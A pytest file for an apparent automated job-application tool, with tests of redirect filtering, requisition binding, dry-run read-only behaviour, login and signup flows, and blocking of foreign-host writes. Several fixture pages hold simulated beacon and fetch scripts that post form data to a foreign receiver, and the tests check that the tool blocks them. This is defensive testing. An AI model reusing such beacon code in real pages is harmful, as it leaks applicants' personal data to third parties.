"""Local dispatch boundary regressions; the employer page, candidate and PDF are fictional."""

from apply_cv_helpers import make_app, make_job
import asyncio
import os
import json
from contextlib import asynccontextmanager, closing
from urllib.parse import parse_qs, urlsplit

import pytest
from apply_fakes import FakeVerifier, FixtureServer, ScriptedPlanner, act, cv_pdf, fast, page, sample_facts, server  # noqa: F401
from apply_service_fakes import FakePool, confirm_step, wait_for_supervised
from cv_fakes import save_confirmed

from jobhunt import db
from jobhunt.apply import apply_entry, engine, service, store
from jobhunt.apply.facts import save_answers
from jobhunt.apply.adapters import Attempt, Receipt, Registry, Requisition
from jobhunt.apply.autonomous import Audience
from jobhunt.apply.destination import RecipientGuard, clean_url, origin
from jobhunt.apply.errors import ApplyError
from jobhunt.apply.supervised import HAS_LOCAL_BRIDGE, call_local
from jobhunt.apply.identity import dispatch_url, resolved_identity
from jobhunt.apply.engine import DRY_UNTESTED, UNSUPPORTED_DISPATCH, Uploads, run_application
from jobhunt.apply.types import RunResult, StepLog, StepPlan
from jobhunt.browser import BrowserPool
from jobhunt.cv import service as cvs
from jobhunt.cv import store as cvstore


def form(snapshot):
    return StepPlan(page_kind="form", actions=[
        act(snapshot, "Prénom", "fill", "first_name"),
        act(snapshot, "CV", "upload_cv", kind="file"),
        act(snapshot, "Envoyer", "click", role="submit"),
    ])


def approved_fixture(profile, tmp_path, url, *, title="Ingénieur systèmes embarqués", company="Société Exemple", **kwargs):
    master = save_confirmed(profile.id)
    job = make_job(profile, url=url, title=title, company=company, **kwargs)
    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
    cvs.approve(app.id, app.current_rev)
    return job, app


@pytest.mark.parametrize("target, allowed", [("%2Fapplication", True), ("%2F%2Fother.example%2Fapplication", False)])
def test_talentsoft_login_return_is_same_host_and_not_persisted(target, allowed):
    base = "https://example.test/Pages/Account.aspx"
    assert clean_url(f"{base}?ReturnUrl={target}", navigation=True) == (base if allowed else "")


@pytest.mark.parametrize("query, cleaned", [
    ("rx_ch=connector&rx_source=board&source=x", "https://example.test/job/42"),
    ("feedId=1&jobPipeline=LinkedIn&mode=apply&LCID=1040&trid=a-b", "https://example.test/job/42"),
    ("jobId=R123&partner=45", "https://example.test/job/42?jobId=R123"),
    ("digest=abc", ""),                      # an unknown key still fails the link closed
    ("next=https%3A%2F%2Fother.example", ""),
])
def test_navigation_drops_attribution_keys_only(query, cleaned):
    assert clean_url(f"https://example.test/job/42?{query}", navigation=True) == cleaned


@pytest.mark.parametrize("scenario", ["dry", "signin", "signup", "mixed", "wrong_requisition", "foreign", "otp"])
async def test_continuity_account_boundary(scenario, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    monkeypatch.setattr(service.accounts, "create_password", lambda host, email: "fixture-password")
    monkeypatch.setattr(service.accounts, "account_known", lambda host, email: scenario not in {"signup", "mixed"})
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    server.html["/jobs/100"] = '<main><h1>Offre</h1><a href="/entry">Postuler</a></main>'
    server.redirects["/entry"] = "/Account/Login?ReturnUrl=%2Fapplication"
    server.html["/Account/Login"] = '''<h1>Connexion</h1><form method="post" action="/Account/Login">
        <label>E-mail<input type="email" name="email"></label>
        <label>Mot de passe<input type="password" name="password"></label>
        <button>Se connecter</button></form><a href="/Account/Register">Créer un compte</a>'''
    server.html["/Account/Register"] = '''<h1>Créer un compte</h1><form method="post" action="/Account/Register">
        <label>E-mail<input type="email" name="email"></label>
        <label>Mot de passe<input type="password" name="password"></label>
        <label>LinkedIn<input name="linkedin"></label><button>Créer mon compte</button></form>'''
    if scenario == "mixed":
        server.html["/Account/Register"] = server.html["/Account/Register"].replace(
            "<button>", '<label>CV<input type="file" name="cv"></label><button>')
    landing = "/jobs/100/apply"
    server.html[landing] = posting_form(landing)
    if scenario == "wrong_requisition":
        server.html[landing] = '<main data-requisition-id="200">' + server.html[landing] + '</main>'
    if scenario == "foreign":
        landing = server.url("collect").replace("127.0.0.1", "localhost")
    if scenario == "otp":
        landing = "/verify-email"
        server.html[landing] = '<h1>Vérifiez votre boîte e-mail</h1>'
    server.post_redirects["/Account/Register"] = landing
    server.post_redirects["/Account/Login"] = landing

    def plan(snapshot):
        if urlsplit(snapshot.url).path == "/jobs/100":
            return StepPlan(page_kind="job_page")
        if "Vérifiez" in snapshot.text:
            return StepPlan(page_kind="email_verification")
        if any(field.kind == "password" for field in snapshot.fields):
            signup = urlsplit(snapshot.url).path.endswith("/Register")
            actions = [act(snapshot, "E-mail", "fill", "account_email"), act(snapshot, "Mot de passe", "fill", "account_password"),
                       act(snapshot, "Créer mon compte" if signup else "Se connecter", "click", role="signup" if signup else "login")]
            if signup and scenario == "mixed":
                actions.insert(0, act(snapshot, "CV", "upload_cv"))
            if signup:
                actions.insert(0, act(snapshot, "LinkedIn", "fill", "linkedin"))
            return StepPlan(page_kind="account_signup" if signup else "account_login", actions=actions)
        return form(snapshot)

    dry_steps = iter([StepPlan(page_kind="job_page"), StepPlan(page_kind="account_login")])
    result = await service.run(app.id, mode="dry_run" if scenario == "dry" else "submit", trigger="user",
                               headless=True, planner=ScriptedPlanner(lambda snap: next(dry_steps) if scenario == "dry" else plan(snap)))
    if scenario == "dry":
        assert result.result.diagnostic_code == "dry_account_gate"
        assert result.result.final_url == server.base
        assert not server.posts
        return
    if scenario == "mixed":
        assert result.status == "needs_human"
        assert not server.posts
        return
    expected = {"signin": "submitted", "signup": "submitted", "wrong_requisition": "needs_human",
                "foreign": "needs_human", "otp": "needs_email"}
    assert result.status == expected[scenario], result.result.diagnostic_code
    account_path = "/Account/Register" if scenario == "signup" else "/Account/Login"
    assert [post["path"] for post in server.posts] == [account_path] + ([landing] if scenario in {"signin", "signup"} else [])
    assert b"%PDF" not in server.posts[0]["body"]
    if scenario == "signup":
        assert parse_qs(server.posts[0]["body"].decode(), keep_blank_values=True)["linkedin"] == [""]
    assert not any(request == "/collect" for request in server.requests)
    with db.connect() as conn:
        binding = json.loads(conn.execute("SELECT binding_json FROM apply_reservations WHERE run_id=?", (result.id,)).fetchone()[0])
    assert binding["landing_host"] == "127.0.0.1" and binding["landing_binding"] == "continuity"


@pytest.fixture
async def production_pool():
    if os.getenv("JOBHUNT_HEADLESS") == "1":
        pytest.skip("production headful pool disabled by JOBHUNT_HEADLESS=1")
    # These tests drive the real Google Chrome headful, which takes focus on the desktop. Agent runs on the operator's
    # Mac set JOBHUNT_FORCE_HEADLESS=1 (env.sh) and skip them; CI runs them headful on every PR.
    if os.environ.get("JOBHUNT_FORCE_HEADLESS", "").strip() == "1":
        pytest.skip("headful production-browser test: runs in CI, skipped on the operator's desktop")
    pool = BrowserPool(headless=False)
    try:
        yield pool
    finally:
        await pool.close()


def posting_form(action):
    return (f'<title>Ingénieur systèmes embarqués</title><form action="{action}" method="post">'
            '<label for="name">Prénom</label><input id="name" name="first_name">'
            '<label for="cv">CV</label><input id="cv" type="file" name="cv"><button>Envoyer</button></form>')


@pytest.mark.parametrize("target", ["/jobs/100/apply", "/jobs/200/apply", "/jobs/100/apply?jobId=200"])
async def test_readonly_inspection_follows_only_bound_apply_link(target, server, profile, tmp_path, fast):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    server.html["/jobs/100"] = f'''<form><label>Contrat <input required></label>
        <label>Localisation du poste <input required></label></form>
        <a href="{target}" onclick="fetch('/clicked', {{method:'POST'}})">Postuler</a>
        <script>fetch('/beacon', {{method:'POST'}}).catch(() => {{}})</script>'''
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    planner = ScriptedPlanner([StepPlan(page_kind="job_page"), form])
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True, planner=planner)
    assert result.result.diagnostic_code == ("dry_apply_form_found" if target == "/jobs/100/apply" else "apply_target_unverified")
    assert len(planner.calls) == (2 if target == "/jobs/100/apply" else 1)
    assert not server.posts and not server.sent and not store.outstanding_attempt(app.id)


@pytest.mark.parametrize("action, expected", [
    ("location.assign('/jobs/100/apply')", "dry_apply_form_found"),
    ("window.open('/jobs/100/apply')", "dry_apply_form_found"),
    ("location.assign('/jobs/200/apply')", "apply_target_unverified"),
])
async def test_readonly_scripted_apply_never_writes(action, expected, server, profile, tmp_path, fast):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    server.html["/jobs/100"] = f'''<main><h1>Ingénieur systèmes embarqués</h1>
        <button type="button" onclick="fetch('/clicked', {{method:'POST'}}); {action}">Postuler</button></main>
        <aside><button onclick="location.assign('/jobs/300')">Postuler</button></aside>'''
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    planner = ScriptedPlanner([StepPlan(page_kind="job_page"), form])
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True, planner=planner)
    assert result.result.diagnostic_code == expected
    assert len(planner.calls) == (2 if expected == "dry_apply_form_found" else 1)
    assert not server.posts and not server.sent and not store.outstanding_attempt(app.id)


@pytest.mark.parametrize("foreign_write", [False, True])
async def test_readonly_apply_input_blocks_foreign_write(foreign_write, server, profile, tmp_path, fast):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    receiver = server.url("blocked").replace("127.0.0.1", "localhost")
    action = (f"fetch('{receiver}', {{method:'POST'}}).catch(() => location.assign('/jobs/100/apply'))"
              if foreign_write else "location.assign('/jobs/100/apply')")
    server.html["/jobs/100"] = f'''<main><h1>Ingénieur systèmes embarqués</h1>
        <form method="post"><input type="submit" value="Postuler" onclick="{action}; return false"></form></main>'''
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    planner = ScriptedPlanner([StepPlan(page_kind="job_page"), form])
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True, planner=planner)
    assert result.result.diagnostic_code == ("apply_target_unverified" if foreign_write else "dry_apply_form_found")
    assert not server.posts and not server.sent and "/blocked" not in server.requests


async def test_dry_hydrates_posting_online_then_inspects_landing_offline(server, profile, tmp_path, fast, monkeypatch):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    server.html["/jobs/100"] = '<main><h1>Ingénieur systèmes embarqués</h1></main>'
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    server.html["/hydrate"] = "ready"
    pages = []
    discover = service.discover

    async def check_discovery(page, *args, **kwargs):
        assert await page.evaluate("""async () => {
            const response = await fetch('/hydrate');
            const button = document.createElement('button');
            button.textContent = 'Postuler';
            button.onclick = () => location.assign('/jobs/100/apply');
            document.querySelector('main').append(button);
            return response.ok;
        }""")
        result = await discover(page, *args, **kwargs)
        pages.append(result[0])
        return result

    class Planner(ScriptedPlanner):
        async def plan(self, snapshot, facts, **kwargs):
            assert all(fact.value is None for fact in facts.facts)
            if pages:
                assert await pages[0].evaluate("""async () => {
                    try { await fetch('/offline-check'); return false; } catch { return true; }
                }""")
            return await super().plan(snapshot, facts, **kwargs)

    monkeypatch.setattr(service, "discover", check_discovery)
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True,
                               planner=Planner([StepPlan(page_kind="job_page"), form]))
    assert result.result.diagnostic_code == "dry_apply_form_found"
    assert "/hydrate" in server.requests and "/offline-check" not in server.requests
    assert not server.posts and not server.sent and not store.outstanding_attempt(app.id)


@pytest.mark.parametrize("scenario", ["system_only", "visible", "wrong_requisition", "redirect_no_replay"])
async def test_talentsoft_entry_posts_only_bound_system_fields(scenario, server, profile, tmp_path, fast, monkeypatch):
    url = server.url("jobs/100")
    monkeypatch.setattr(apply_entry, "ats_target", lambda target: ("talentsoft", ("fixture", "100")) if target == url else (None, None))
    _, app = approved_fixture(profile, tmp_path, url)
    extra = '<input type="text" name="name" value="fixture">' if scenario == "visible" else ""
    req = "200" if scenario == "wrong_requisition" else "100"
    system_form = f'''<form method="post" action="/jobs/100/apply"><input type="hidden" name="idOffre" value="{req}">
        <input type="hidden" name="culture" value="fr">{extra}<input type="submit" value="Postuler"></form>'''
    server.html["/jobs/100"] = '<main><h1>Offre</h1>' + system_form * (1 if scenario == "visible" else 2) + '</main>'
    server.post_pages["/jobs/100/apply"] = "form.html"
    if scenario == "redirect_no_replay":
        server.redirects["/jobs/100/apply"] = "/jobs/100/redirect"
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), StepPlan(page_kind="form")]))
    if scenario == "system_only":
        assert server.posts == [{"path": "/jobs/100/apply", "body": b"idOffre=100&culture=fr"}]
        assert result.result.diagnostic_code in {"dry_apply_form_found", "dry_apply_form_needs_input"}
    elif scenario == "redirect_no_replay":
        assert server.posts == [{"path": "/jobs/100/apply", "body": b"idOffre=100&culture=fr"}]
        assert "/jobs/100/redirect" not in server.requests and result.result.diagnostic_code == "recipient_refused_redirect"
    else:
        assert not server.posts and result.result.diagnostic_code == "apply_target_unverified"
    assert not store.outstanding_attempt(app.id)


async def test_dry_initial_navigation_accepts_utf8_encoded_path(server, profile, tmp_path, fast):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100/ingénieur-d’étude"))
    server.html["/jobs/100/ing%C3%A9nieur-d%E2%80%99%C3%A9tude"] = (
        '<main><h1>Ingénieur</h1><a href="/jobs/100/apply">Postuler</a></main>'
    )
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), form]))
    assert result.result.diagnostic_code == "dry_apply_form_found"
    assert not server.posts


@pytest.mark.parametrize("second_id", ["100", "200"])
async def test_sap_entry_prefers_bound_apply_and_ignores_subframe(second_id, server, profile, tmp_path, fast, monkeypatch):
    source = server.url("jobs/100")
    monkeypatch.setattr(apply_entry, "ats_target", lambda url: ("successfactors", None) if url == source else (None, None))
    _, app = approved_fixture(profile, tmp_path, source)
    server.html["/jobs/100"] = f'''<main><h1>Offre</h1><a href="/talentcommunity/apply/100/">Postuler</a>
        <a href="/talentcommunity/apply/{second_id}/">Apply</a></main>'''
    frame = server.url("map").replace("127.0.0.1", "localhost")
    server.html["/talentcommunity/apply/100/"] = f'<iframe src="{frame}"></iframe>' + posting_form("/talentcommunity/apply/100/")
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), form]))
    assert result.result.diagnostic_code == ("dry_apply_form_found" if second_id == "100" else "apply_control_ambiguous")
    assert "/map" not in server.requests and not server.posts


def test_workday_alias_and_smartrecruiters_publication_require_exact_binding():
    posting = "https://example.wd3.myworkdayjobs.com/External/job/Paris/Engineer_R0341251-1"
    entry = apply_entry._workday_entry(posting)
    assert entry == posting + "/apply/applyManually"
    probe = apply_entry.Probe(posting, "R0341251", [])
    assert probe.navigation(entry)
    assert not probe.navigation(entry.replace("R0341251", "R0341252"))
    assert not probe.navigation(entry.replace("-1/", "-123/"))
    smart = apply_entry.Probe("https://jobs.smartrecruiters.com/Example/123456-Engineer", None, [])
    uuid = "aea65468-b6ed-4f80-9d0d-60ee2cd01f22"
    assert not apply_entry._smart_entry(smart, {"id": "123457", "publicationId": uuid})
    target = apply_entry._smart_entry(smart, {"id": "123456", "publicationId": uuid})
    assert smart.navigation(target) and not smart.navigation(target.replace("/example/", "/other/"))


@pytest.mark.parametrize("challenge", [False, True])
async def test_workday_direct_entry_waits_for_late_render(challenge, server, profile, tmp_path, fast, monkeypatch):
    path = "External/job/Paris/Engineer_R0341251-1"
    entry_path = f"/{path}/apply/applyManually"
    monkeypatch.setattr(apply_entry, "ats_target", lambda url: ("workday", ("fixture", "r0341251"))
                        if urlsplit(url).path.startswith(f"/{path}") else (None, None))
    _, app = approved_fixture(profile, tmp_path, server.url(path))
    server.html[f"/{path}"] = "<main><h1>Offre</h1></main>"
    delayed = json.dumps(posting_form(entry_path))
    server.html[entry_path] = ("<title>Just a moment...</title>" if challenge else
        f'''<main></main><script>setTimeout(() => {{
            document.querySelector('main').innerHTML = {delayed};
            document.querySelector('main').dataset.automationId = 'applyManually';
        }}, 500)</script>''')
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), form]))
    assert result.result.diagnostic_code == ("challenge_or_rate_limited" if challenge else "dry_apply_form_found")
    assert entry_path in server.requests and not server.posts


@pytest.mark.parametrize("identifier, expected", [("JR100", "dry_apply_form_found"), ("JR200", "apply_target_unverified")])
async def test_readonly_scripted_ats_landing_checks_structured_identity(identifier, expected, server, profile, tmp_path, fast, monkeypatch):
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/JR100"))
    landing = server.url("application/start").replace("127.0.0.1", "localhost")
    monkeypatch.setattr(apply_entry, "ats_target", lambda url: ("workday" if urlsplit(url).hostname == "localhost" else None, None))
    server.html["/jobs/JR100"] = f'''<main><h1>Ingénieur systèmes embarqués</h1>
        <div id="cookies"><button onclick="window.rejected=true; this.parentNode.remove()">Tout refuser</button></div>
        <button onclick="if(window.rejected) location.assign('{landing}')">Postuler</button></main>'''
    server.html["/application/start"] = f'''<script type="application/ld+json">
        {{"@type":"JobPosting","identifier":{{"value":"{identifier}"}}}}</script>''' + posting_form("/application/start")
    planner = ScriptedPlanner([StepPlan(page_kind="job_page"), form])
    result = await service.run(app.id, mode="dry_run", trigger="user", headless=True, planner=planner)
    assert result.result.diagnostic_code == expected
    assert len(planner.calls) == (2 if expected == "dry_apply_form_found" else 1)
    assert not server.posts and not server.sent


async def test_autonomous_skips_search_filters_and_reserves_noncanonical_job(server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"), extra={"origin_resolution": {
        "submit_ats": "successfactors", "canonical_ok": False, "requisition": "100", "tenant": None,
    }})
    server.html["/jobs/100"] = '''<form action="/search" method="post">
        <label>Contrat <input required></label><label>Localisation du poste <input required></label></form>
        <script src="/legacy.js"></script><a href="/jobs/100/apply">Je postule</a>'''
    server.redirects["/legacy.js"] = "/unverified.js"
    server.html["/jobs/100/apply"] = posting_form("/jobs/100/apply")
    planner = ScriptedPlanner([StepPlan(page_kind="job_page"), form])
    result = await service.run(app.id, mode="submit", trigger="user", headless=True, planner=planner)
    assert result.status == "submitted"
    assert [post["path"] for post in server.posts] == ["/jobs/100/apply"]
    assert "/legacy.js" in server.requests and "/unverified.js" not in server.requests


async def test_landing_dedupe_keeps_released_confirmed_attempt(server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    _, first = approved_fixture(profile, tmp_path, server.url("careers/first"))
    _, second = approved_fixture(profile, tmp_path, server.url("careers/second"),
                                 company="Autre société", title="Analyste comptable")
    for path in ("/careers/first", "/careers/second"):
        server.html[path] = '<main><h1>Offre</h1><a href="/apply">Postuler</a></main>'
    server.html["/apply"] = posting_form("/apply")
    result = await service.run(first.id, mode="submit", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), form]))
    assert result.status == "submitted"
    assert store.release_reservation(first.id) == 1
    result = await service.run(second.id, mode="submit", trigger="user", headless=True,
                               planner=ScriptedPlanner([StepPlan(page_kind="job_page"), form]))
    assert result.status != "submitted"
    assert [post["path"] for post in server.posts] == ["/apply"]


@pytest.mark.parametrize("first_direct", [True, False])
@pytest.mark.parametrize("match_by", ["workday_variant", "landing_digest"])
def test_reservation_and_landing_dedupe_in_both_orders(profile, tmp_path, first_direct, match_by):
    workday = match_by == "workday_variant"
    direct = ("https://acme.wd3.myworkdayjobs.com/External/job/Paris/Engineer_R123-1" if workday
              else "https://jobs.example.test/apply")
    landing = direct + "/apply/applyManually" if workday else direct
    metadata = {"origin_resolution": {"tenant": "acme", "requisition": "R123-1"}} if workday else {}
    _, ats_app = approved_fixture(profile, tmp_path, direct, extra=metadata)
    _, careers_app = approved_fixture(profile, tmp_path, "https://careers.acme.example/jobs/123",
                                     title="Analyste comptable")

    def prepare(app, url, tenant="", requisition=None):
        app = cvstore.get_application(app.id)
        run = store.start_run(app.id, app.current_rev, "submit", "user", lambda run_id: tmp_path / str(run_id))
        return Attempt(run.id, app.id, app.current_rev, app.approved_sha256, url, urlsplit(url).hostname,
                       "fixture-nonce", None, tenant, requisition, f"legacy-key-{app.id}", profile.id, autonomous=True)

    def reserve(attempt):
        store.reserve_send(attempt.run_id, profile_id=profile.id, application_id=attempt.application_id, trigger="user",
                           role_key="", url_key=store._url_key(attempt.url), daily_cap=9, binding=attempt)

    ats_attempt = prepare(ats_app, direct, "acme" if workday else "", "R123-1" if workday else None)
    careers_attempt = prepare(careers_app, "https://careers.acme.example/jobs/123")
    if first_direct:
        reserve(ats_attempt)
        reserve(careers_attempt)
        with pytest.raises(ApplyError) as refused:
            store.bind_apply_landing(careers_attempt, landing)
        assert str(refused.value) == store.NOT_ACTIVE
    else:
        reserve(careers_attempt)
        bound = store.bind_apply_landing(careers_attempt, landing)
        assert bound.requisition_id == ("r123" if workday else None)
        with pytest.raises(ApplyError, match="Un essai existe déjà"):
            reserve(ats_attempt)


async def test_autonomous_noncanonical_job_refuses_real_fuzzy_duplicate(server, profile, tmp_path, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    _, first = approved_fixture(profile, tmp_path, server.url("jobs/100"))
    _, second = approved_fixture(profile, tmp_path, server.url("jobs/200"), title="Ingénieur système embarqué",
                                 extra={"origin_resolution": {"submit_ats": "successfactors", "canonical_ok": False}})
    legacy = store.start_run(first.id, first.current_rev, "submit", "user", lambda run_id: tmp_path / "legacy")
    store.reserve_send(legacy.id, profile_id=profile.id, application_id=first.id, trigger="user",
                       role_key="", url_key="", daily_cap=9)
    store.finish_and_settle(legacy.id, RunResult(status="failed"))
    result = await service.run(second.id, mode="submit", trigger="user", headless=True, planner=ScriptedPlanner(form))
    assert result.status == "blocked" and result.result.diagnostic_code == "duplicate_unconfirmed"
    assert not server.requests and not store.outstanding_attempt(second.id)


def test_verified_apply_target_requires_matching_metadata_and_requisition():
    posting = "https://careers.example.com/job/100"
    target = "https://example.wd1.myworkdayjobs.com/en-US/careers/job/Paris/Role_R100/apply"
    metadata = dict(posting_url=posting, apply_url=target, tenant="example", requisition="R100",
                    canonical_ok=True, state="resolved", submit_ats="workday", confidence=0.99)
    assert dispatch_url(posting, {"origin_resolution": metadata}, autonomous=True) == target
    for invalid in (dict(canonical_ok=False), dict(posting_url=posting + "0"), dict(requisition="R200")):
        assert dispatch_url(posting, {"origin_resolution": metadata | invalid}, autonomous=True) == posting


def test_smartrecruiters_redirect_requires_same_tenant_and_requisition():
    posting = "https://jobs.smartrecruiters.com/Example/744000000001-engineer"
    audience = Audience(posting, (), lambda: None)
    apply = "https://www.smartrecruiters.com/oneclick-ui/company/Example/publication/744000000001"
    assert audience.initial_redirect(posting, apply)
    assert not audience.initial_redirect(posting, apply.replace("Example", "Other"))
    assert not audience.initial_redirect(posting, apply.replace("0001", "0002"))
    assert not audience.initial_redirect(posting, apply + "?jobId=744000000002")


@pytest.mark.parametrize("scenario", ["json", "no_receipt", "foreign", "wrong_posting", "late_foreign", "url", "text",
                                      "json_draft_step"])
async def test_production_autonomous_scripted_submit(scenario, production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    with closing(FixtureServer()) as receiver:
        endpoint = (receiver.url("submit") if scenario == "foreign" else
                    "/jobs/200/apply" if scenario == "wrong_posting" else "/api/applications")
        server.post_json[endpoint] = ({"applicationId": "fixture-123", "success": True}
                                      if scenario in {"json", "late_foreign"} else
                                      {"applicationId": "draft-1"} if scenario == "json_draft_step" else
                                      {"status": "pending", "success": True})
        server.html["/jobs/100"] = posting_form("/jobs/100").replace(' method="post"', '') + """<script>
        document.forms[0].addEventListener('submit', async event => {
            event.preventDefault();
            await new Promise(done => setTimeout(done, 200));
            await fetch(%s, {method: 'POST', body: new FormData(event.target)});
            if (%s) navigator.sendBeacon(%s, 'synthetic');
            if (%s) location.href = '/application-received';
            if (%s) document.body.innerHTML = '<h1>Merci, votre candidature a bien été reçue.</h1>';
            if (%s) document.body.innerHTML = '<h1>Étape 2 sur 3 : questionnaire</h1><form>'
                + '<label for="q1">Pourquoi nous ?</label><input id="q1" name="q1" required>'
                + '<label for="q2">Disponibilité</label><input id="q2" name="q2" required>'
                + '<label for="q3">Mobilité</label><input id="q3" name="q3" required><button>Suivant</button></form>';
        });
        </script>""" % (json.dumps(endpoint), json.dumps(scenario == "late_foreign"), json.dumps(receiver.url("beacon")),
                         json.dumps(scenario == "url"), json.dumps(scenario == "text"), json.dumps(scenario == "json_draft_step"))
        server.html["/application-received"] = "<h1>Merci</h1>"
        job, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))
        result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
        assert result.submit_clicked_at and not receiver.sent
        if scenario == "late_foreign":
            # A third-party beacon after the data was entered is aborted; the first-party send and its receipt stand.
            assert result.status == "submitted", result.result.dispatch_diagnostics
            assert result.result.dispatch_diagnostics.receipt_reason == "confirmation_json"
            assert result.result.dispatch_diagnostics.aborted_hosts == ["127.0.0.1"]
        elif scenario in {"json", "url", "text"}:
            assert result.status == "submitted", result.result.dispatch_diagnostics
            assert result.result.dispatch_diagnostics.receipt_reason == f"confirmation_{scenario}"
            assert db.get_job(job.id).status == "applied"
        else:
            assert result.status == "failed" and store.outstanding_attempt(app.id).id == result.id
            await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(form))
        assert [post["path"] for post in server.posts] == ([] if scenario in {"foreign", "wrong_posting"} else [endpoint])


@pytest.mark.parametrize("scenario", ["three_steps", "cap", "changed_identity"])
async def test_production_autonomous_scripted_next(scenario, production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    monkeypatch.setattr(service.get_settings(), "apply_max_steps", 40)
    last = 13 if scenario == "cap" else 3
    server.post_json["/api/advance"] = {"status": "draft"}
    server.post_json["/api/applications"] = {"application_id": "fixture-456"}
    server.html["/jobs/100"] = """<title>Ingénieur systèmes embarqués</title><main></main><script>
        let step = 1;
        const last = %s;
        const draw = () => {
            document.querySelector('main').innerHTML = `<form>
                <label for="name">Prénom étape ${step}</label><input id="name" name="first_name" required>
                <button type="button">${step === last ? 'Envoyer' : 'Suivant'}</button></form>`;
            document.querySelector('button').onclick = async () => {
                await fetch(step === last ? '/api/applications' : '/api/advance',
                            {method: 'POST', body: new FormData(document.forms[0])});
                if (step !== last) { step += 1; draw(); }
                if (%s && step === 2) history.pushState({}, '', '/jobs/200');
            };
        };
        draw();
    </script>""" % (last, json.dumps(scenario == "changed_identity"))
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    def plan(snapshot):
        label = next(field.label for field in snapshot.fields if field.kind == "text")
        final = label.endswith(f" {last}")
        return StepPlan(page_kind="form", actions=[act(snapshot, label, "fill", "first_name"),
                        act(snapshot, "Envoyer" if final else "Suivant", "click", role="submit" if final else "next")])

    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(plan))
    assert result.status == ("submitted" if scenario == "three_steps" else "needs_human"), (
        result.result.dispatch_diagnostics, len(result.result.steps), [post["path"] for post in server.posts])
    paths = {"three_steps": ["/api/advance"] * 2 + ["/api/applications"],
             "cap": ["/api/advance"] * 12, "changed_identity": ["/api/advance"]}
    assert [post["path"] for post in server.posts] == paths[scenario]
    if scenario != "three_steps":
        assert result.submit_clicked_at is None


@pytest.mark.parametrize("otp", [False, True])
async def test_production_autonomous_scripted_login(otp, production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    monkeypatch.setattr(service.accounts, "create_password", lambda host, email: "fixture-password")
    monkeypatch.setattr(service.accounts, "account_known", lambda host, email: True)
    server.post_json["/api/login"] = {"success": True}
    after_login = ('<h1>Vérifiez votre boîte e-mail</h1>' if otp else posting_form('/jobs/100').replace(
        '<button>', '<button type="button" onclick="this.form.requestSubmit()">'))
    server.html["/jobs/100"] = """<title>Connexion</title><form>
        <label for="email">E-mail</label><input type="email" id="email" name="email" required>
        <label for="pw">Mot de passe</label><input type="password" id="pw" name="password" required>
        <button>Se connecter</button></form><script>
        document.forms[0].onsubmit = async event => {
            event.preventDefault();
            await fetch('/api/login', {method: 'POST', body: new FormData(event.target)});
            document.body.innerHTML = %s;
        };</script>""" % json.dumps(after_login)
    _, app = approved_fixture(profile, tmp_path, server.url("jobs/100"))

    def plan(snapshot):
        if "Vérifiez" in snapshot.text:
            return StepPlan(page_kind="email_verification")
        if any(field.kind == "password" for field in snapshot.fields):
            return StepPlan(page_kind="account_login", actions=[act(snapshot, "E-mail", "fill", "account_email"),
                act(snapshot, "Mot de passe", "fill", "account_password"),
                act(snapshot, "Se connecter", "click", role="login")])
        return form(snapshot)

    result = await service.run(app.id, mode="submit", trigger="user", pool=production_pool, planner=ScriptedPlanner(plan))
    assert result.status == ("needs_email" if otp else "submitted"), result.result.dispatch_diagnostics
    assert [post["path"] for post in server.posts] == (["/api/login"] if otp else ["/api/login", "/jobs/100"])
    assert bool(result.submit_clicked_at) != otp
async def test_production_autonomous_submits_with_receipt_and_scoped_decisions(production_pool, server, profile, tmp_path, fast, monkeypatch):
    monkeypatch.setattr(service.get_settings(), "apply_autonomous", True)
    page_html = posting_form("/jobs/100").replace("<button>", """
        <label><input name="privacy" type="checkbox" required>I accept the privacy policy</label>
        <label><input name="marketing" type="checkbox">Subscribe to the marketing newsletter</label>
        <label for="eeo">Disability self-identification</label>
        <select id="eeo" name="eeo" required><option value="">Choose</option>
